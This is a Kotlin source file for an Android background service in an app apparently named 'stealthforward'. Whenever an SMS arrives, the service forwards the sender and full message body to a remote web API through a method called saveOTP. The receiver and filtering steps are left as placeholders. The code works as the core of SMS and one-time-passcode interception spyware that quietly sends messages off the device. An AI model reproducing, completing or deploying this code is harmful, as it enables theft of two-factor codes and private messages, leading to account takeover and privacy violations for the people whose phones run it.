package com.nf.stealthforward.service

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.util.Log
import com.nf.stealthforward.api.NetworkClient
import com.nf.stealthforward.listener.SmsListener
import retrofit2.Call
import retrofit2.Response

class BackgroundService : Service(), SmsListener {

    companion object {
        private val TAG = BackgroundService::class.java.simpleName

        fun start(context: Context) {
            Log.d(TAG, "starting service requested")
            Intent(context, BackgroundService::class.java).also { context.startService(it) }
        }

        fun stop() {
            Log.d(TAG, "stopping service requested")
            instance?.stopSelf()
        }

        var instance: BackgroundService? = null
    }

    override fun onCreate() {
        instance = this
    }

    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
        Log.d(TAG, "background service started")
        return super.onStartCommand(intent, flags, startId)
    }

    override fun onBind(intent: Intent): IBinder? {
        return null
    }

    override fun onDestroy() {
        Log.d(TAG, "background service stopped")
        instance = null
    }

    ////////////////////////////////////////////////////////////////////////////////////////////////

    override fun onSmsReceived(sender: String, body: String) {
        val receiver = "" // get from pref

        // filter sms



        val apiCall = NetworkClient.retrofitClient.saveOTP(receiver, sender, body)
        apiCall.enqueue(object : retrofit2.Callback<String> {
            override fun onFailure(call: Call<String>, t: Throwable) {
                Log.e(TAG, "Failed to call web api. error: ${t.localizedMessage}")
            }

            override fun onResponse(call: Call<String>, response: Response<String>) {
                Log.i(TAG, "Succeeded to call web api. response: ${response.body()}")
            }
        })
    }
}
